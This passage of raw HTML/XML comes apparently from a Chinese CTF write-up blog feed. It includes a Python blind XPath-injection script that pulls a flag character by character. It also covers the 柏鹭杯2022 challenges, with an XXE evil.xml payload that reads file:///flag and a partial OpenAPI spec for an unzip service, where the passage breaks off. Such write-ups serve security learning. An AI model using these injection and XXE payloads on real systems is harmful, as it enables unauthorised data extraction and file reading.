class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"'or substring(name(/*[1]), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">, 1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">'  and ''='"</span></span>            r <span class="token operator">=</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                res<span class="token operator">+=</span>char                <span class="token comment"># print(res)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getRootname: '</span><span class="token operator">+</span>res<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getSecondCnt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or count(/root)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">  and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getSecondCnt'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getSecondLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or string-length(name(/root/*[1]))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">  and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getSecondLen'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getSecondname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"'or substring(name(/root/*[1]), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">, 1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">'  and ''='"</span></span>            r <span class="token operator">=</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                res<span class="token operator">+=</span>char                <span class="token comment"># print(res)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getSecondname: '</span><span class="token operator">+</span>res<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getThirdCnt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or count(/root/user/*)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getRootCnt'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getThirdLen1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or string-length(name(/root/user[position()=1]/*[1]))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getThirdLen1'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getThirdLen2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or string-length(name(/root/user[position()=1]/*[2]))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string"> and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getThirdLen2'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getThirdname1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"'or substring(name(/root/user[position()=1]/*[1]), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">, 1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">'  and ''='"</span></span>            r <span class="token operator">=</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                res<span class="token operator">+=</span>char                <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getThirdname1: '</span><span class="token operator">+</span>res<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getThirdname2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"'or substring(name(/root/user[position()=1]/*[1]), </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">, 1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">'  and ''='"</span></span>            r <span class="token operator">=</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                res<span class="token operator">+=</span>char                <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getThirdname2: '</span><span class="token operator">+</span>res<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getflagLen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#flag在第二个username中</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"'or string-length((//user[position()=1]/username[position()=2]))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">  and ''='"</span></span>        r<span class="token operator">=</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getflagLen'</span><span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"'or substring((//user[position()=1]/username[position()=2]),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>char<span class="token punctuation">&#125;</span></span><span class="token string">'  and ''='"</span></span>            r <span class="token operator">=</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">'&lt;p>user1&lt;/p>'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                res<span class="token operator">+=</span>char                <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'getFlag: '</span><span class="token operator">+</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># getRootCnt()</span>    <span class="token comment"># getRootnameLen()</span>    <span class="token comment"># getRootname()</span>    <span class="token comment"># getSecondCnt()</span>    <span class="token comment"># getSecondLen()</span>    <span class="token comment"># getSecondname()</span>    <span class="token comment"># getThirdCnt() #2</span>    <span class="token comment"># getThirdLen1()</span>    <span class="token comment"># getThirdLen2()</span>    <span class="token comment"># getThirdname1()</span>    <span class="token comment"># getThirdname2()</span>    <span class="token comment"># getflagLen()#42</span>    getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTFWEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>柏鹭杯2022</title>
      <link href="/2022/09/15/bo-lu-bei-2022/"/>
      <url>/2022/09/15/bo-lu-bei-2022/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>题目提示XXE</p><p>evil.xml</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY a SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;]&gt;&lt;binbin&gt;&amp;a;&lt;&#x2F;binbin&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后上传evil.xml就有flag了</p><h2 id="简单的解压unzip"><a href="#简单的解压unzip" class="headerlink" title="简单的解压unzip"></a>简单的解压unzip</h2><p>&#x2F;openapi.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"openapi"</span><span class="token operator">:</span> <span class="token string">"3.0.2"</span><span class="token punctuation">,</span>    <span class="token property">"info"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"unzip"</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"hello world\n"</span><span class="token punctuation">,</span>        <span class="token property">"contact"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"300188"</span><span class="token punctuation">,</span>            <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://www.300188.cn/"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"license"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"v0.0.1"</span><span class="token punctuation">,</span>            <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://www.300188.cn/"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.0.1"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"paths"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"/"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Index"</span><span class="token punctuation">,</span>                <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"index__get"</span><span class="token punctuation">,</span>                <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>                        <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"/server.tar.gz"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"tags"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"sourcecode"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Code Download"</span><span class="token punctuation">,</span>                <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"code_download_server_tar_gz_get"</span><span class="token punctuation">,</span>                <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>                        <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"/extract"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"tags"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"extract"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Extract"</span><span class="token punctuation">,</span>                <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"extract_extract_post"</span><span class="token punctuation">,</span>                <span class="token property">"requestBody"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"multipart/form-data"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/Body_extract_extract_post"</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>                        <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>                        <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                                    <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"components"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"schemas"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"Body_extract_extract_post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Body_extract_extract_post"</span><span class="token punctuation">,</span>                <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"file"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>                <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"file"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"File"</span><span class="token punctuation">,</span>                        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>                        <span class="token property">"format"</span><span class="token operator">:</span> <span class="token string">"binary"</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"HTTPValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"HTTPValidationError"</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>                <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Detail"</span><span class="token punctuation">,</span>                        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>                        <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/ValidationError"</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"ValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"ValidationError"</span><span class="token punctuation">,</span>                <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"loc"</span><span class="token punctuation">,</span>                    <span class="token string">"msg"</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>                <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"loc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Location"</span><span class="token punctuation">,</span>                        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>                        <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                                <span class="token punctuation">&#123;</span>                                    <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                                <span class="token punctuation">&#123;</span>                                    <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"integer"</span>                                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">]</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Message"</span><span class="token punctuation">,</span>                        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                    <span class="token property">"type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Error Type"</span><span class="token punctuation">,</span>                        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"tags"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"extract"</span><span class="token punctuation">,</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"上传压缩包解压读取"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"sourcecode"</span><span class="token punctuation">,</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"源码下载"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><sp